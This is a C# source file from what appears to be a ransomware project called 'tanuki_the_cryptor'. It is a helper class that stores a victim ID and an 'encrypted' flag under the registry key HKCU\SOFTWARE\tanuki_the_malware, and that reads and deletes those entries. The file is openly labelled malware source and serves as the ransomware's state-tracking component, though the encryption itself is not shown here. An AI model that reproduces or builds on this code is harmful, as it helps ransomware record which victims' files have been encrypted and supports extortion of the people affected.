using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace tanuki_the_cryptor
{
    public static class Registers
    {
        public static void AddIdEntry(byte[] id)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE", true);
            if(registryKey != null)
            {
                registryKey.CreateSubKey("tanuki_the_malware");
                registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\tanuki_the_malware", true);
                registryKey.SetValue("id", id);
                registryKey.Close();
            }
        }

        public static void AddEncryptedEntry()
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE", true);
            if(registryKey != null)
            {
                registryKey.CreateSubKey("tanuki_the_malware");
                registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\tanuki_the_malware", true);
                registryKey.SetValue("encrypted", true);
                registryKey.Close();
            }      
        }

        public static void DeleteEntries()
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE", true);
            try
            {
                if(registryKey != null)
                {
                    Registry.CurrentUser.DeleteSubKey("SOFTWARE\\tanuki_the_malware");
                    registryKey.Close();
                }
            }
            catch(Exception ex) { Utility.ConsoleLog($"Error removign subkey: {ex.Message}"); }
        }

        public static (byte[], bool) GetEntriesValue()
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\tanuki_the_malware", false);
            if(registryKey != null)
            {
                byte[] id = null;
                object id_obj = registryKey.GetValue("id", null);
                if (id_obj != null)
                    id = (byte[])id_obj;
                
                bool encrypted = Convert.ToBoolean(registryKey.GetValue("encrypted", false));
                registryKey.Close();

                return (id, encrypted);
            }

            return (null, false);
        }
    }
}
